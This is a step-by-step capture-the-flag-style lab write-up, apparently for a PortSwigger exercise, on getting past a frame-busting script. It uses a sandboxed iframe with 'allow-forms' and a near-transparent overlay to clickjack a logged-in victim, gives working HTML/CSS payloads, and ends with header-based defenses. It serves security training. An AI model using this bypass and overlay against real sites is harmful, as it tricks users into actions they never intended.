# Lab 03 — Clickjacking With Frame-Busting Script

## Objective

Exploit a clickjacking vulnerability against a page that contains a frame-busting script.

The lab demonstrates that client-side frame-busting protections may not always prevent a page from being framed.

---

# Attack Concept

```text
Target Page
      ↓
Frame-Busting JavaScript
      ↓
Attempts to Escape iframe
      ↓
Sandbox Restriction
      ↓
Top-Level Navigation Prevented
      ↓
Target Remains Framed
      ↓
Clickjacking Overlay
      ↓
Victim Interaction
```

---

# Step 1 — Identify the Target

Open the lab application and identify the page containing the sensitive action.

Use:

```text
Proxy → HTTP history
```

to inspect the relevant request and response.

---

# Step 2 — Inspect the Page

Look at the target page's JavaScript.

Search for frame-busting behavior such as:

```javascript
window.top
```

```javascript
window.self
```

```javascript
top.location
```

The purpose is to determine whether the application attempts to escape from an iframe.

---

# Step 3 — Understand the Frame-Busting Behavior

A frame-busting script may conceptually behave like:

```javascript
if (window.top !== window.self) {
    window.top.location = window.self.location;
}
```

The intended behavior is:

```text
Page detects framing
       ↓
Attempts to navigate top-level window
       ↓
Escapes iframe
```

---

# Step 4 — Create a Basic iframe

Create an attacker-controlled page containing:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/"></iframe>
```

Replace:

```text
YOUR-LAB-ID
```

with the actual lab identifier.

---

# Step 5 — Test Frame-Busting

Load the attacker page.

Observe whether:

```text
Target Page
      ↓
Detects iframe
      ↓
Attempts to escape
```

If the page successfully escapes, basic framing is not sufficient.

The lab requires bypassing the frame-busting behavior.

---

# Step 6 — Use iframe sandbox

Use the HTML5 `sandbox` attribute.

Example:

```html
<iframe
    src="https://YOUR-LAB-ID.web-security-academy.net/"
    sandbox="allow-forms">
</iframe>
```

The important part is:

```text
allow-forms
```

while:

```text
allow-top-navigation
```

is not included.

---

# Why This Matters

The sandbox can restrict the framed page from navigating the top-level browsing context.

Conceptually:

```text
Frame-Busting Script
        ↓
Attempts top-level navigation
        ↓
Sandbox restriction
        ↓
Navigation blocked
        ↓
Page remains inside iframe
```

---

# Step 7 — Verify the Bypass

Load the sandboxed iframe.

Confirm that:

```text
Target Page
      ↓
Remains inside iframe
```

rather than navigating the top-level window.

---

# Step 8 — Identify the Sensitive Action

Locate the target control that the lab expects the victim to interact with.

Determine:

```text
Button position
Button dimensions
Page location
```

---

# Step 9 — Create the Overlay

Use CSS to position a visible decoy over the target control.

Example:

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>

<div>Click me</div>

<iframe
    src="https://YOUR-LAB-ID.web-security-academy.net/"
    sandbox="allow-forms">
</iframe>
```

---

# Step 10 — Align the Decoy

During testing:

```css
opacity: 0.1;
```

allows the target page to remain partially visible.

Adjust:

```css
top
left
width
height
```

until the decoy is directly over the intended target control.

---

# Step 11 — Hide the Target

Once alignment is correct:

```css
opacity: 0.0001;
```

can be used.

The victim should see only the attacker-controlled decoy.

---

# Step 12 — Deliver Exploit

In the authorized PortSwigger lab:

```text
Save exploit
     ↓
Deliver exploit to victim
```

The victim loads the attacker-controlled page while authenticated.

---

# Attack Flow

```text
Victim Logged In
       ↓
Attacker Page Opened
       ↓
Sandboxed iframe Loads Target
       ↓
Frame-Busting Script Executes
       ↓
Top-Level Navigation Blocked
       ↓
Target Remains Framed
       ↓
Target Action Positioned Under Decoy
       ↓
Victim Clicks
       ↓
Target Action Executes
```

---

# Important Sandbox Configuration

The relevant configuration is:

```html
sandbox="allow-forms"
```

Do not add:

```text
allow-top-navigation
```

because the lab relies on restricting the frame's ability to navigate the top-level window.

---

# Burp Suite Workflow

```text
Proxy
  ↓
HTTP History
  ↓
Identify Target
  ↓
Inspect JavaScript
  ↓
Find Frame-Busting Logic
  ↓
Create iframe
  ↓
Test Frame-Busting
  ↓
Add sandbox="allow-forms"
  ↓
Verify Target Remains Framed
  ↓
Create Overlay
  ↓
Align Target Action
  ↓
Reduce Opacity
  ↓
Deliver Exploit
```

---

# Troubleshooting

## Target Escapes the iframe

Check the iframe:

```html
sandbox="allow-forms"
```

Make sure:

```text
allow-top-navigation
```

is not present.

---

## Forms Do Not Work

Check that:

```text
allow-forms
```

is present.

---

## Target Button Is Misaligned

Temporarily use:

```css
opacity: 0.1;
```

Then adjust:

```css
top
left
```

---

## iframe Is Not Visible

Check:

```text
width
height
position
z-index
opacity
```

---

# Final Checklist

```text
☐ Identified target page
☐ Inspected frame-busting JavaScript
☐ Confirmed target attempts top-level navigation
☐ Created iframe
☐ Tested frame-busting
☐ Added sandbox attribute
☐ Used sandbox="allow-forms"
☐ Did not allow top-level navigation
☐ Confirmed target remains framed
☐ Identified sensitive action
☐ Created decoy
☐ Aligned target control
☐ Tested using partial opacity
☐ Reduced opacity
☐ Delivered exploit
☐ Confirmed target action
☐ Lab solved
```

---

# Key Learning

This lab demonstrates that client-side frame-busting scripts are not necessarily sufficient protection against clickjacking.

The important chain is:

```text
Frame-Busting Script
        +
Sandboxed iframe
        ↓
Top-Level Navigation Restricted
        ↓
Target Remains Framed
        ↓
Clickjacking Possible
```

The stronger defense is to prevent the target page from being framed at the HTTP-policy level using:

```http
X-Frame-Options
```

or:

```http
Content-Security-Policy: frame-ancestors
```